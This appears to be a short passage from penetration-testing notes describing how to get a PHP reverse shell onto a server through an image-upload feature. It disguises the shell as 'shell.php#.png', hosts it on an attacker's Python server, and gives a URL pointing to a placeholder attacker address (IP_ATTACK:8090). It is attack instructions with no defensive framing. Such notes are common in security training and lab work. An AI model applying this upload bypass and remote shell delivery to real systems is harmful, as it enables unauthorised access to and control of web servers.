- **Shell shenanigans**:
  - If you can upload images and its working with php you can try this:
  - 1st get a reverse shell like one in [Reverse shells ðŸ‘¾](reverse_shells.md)
  - Then create a file like `shell.php#.png`
  - Serve a python server
  - Paste the path to it:

```shell
http://IP_ATTACK:8090/shell.php#.png
```
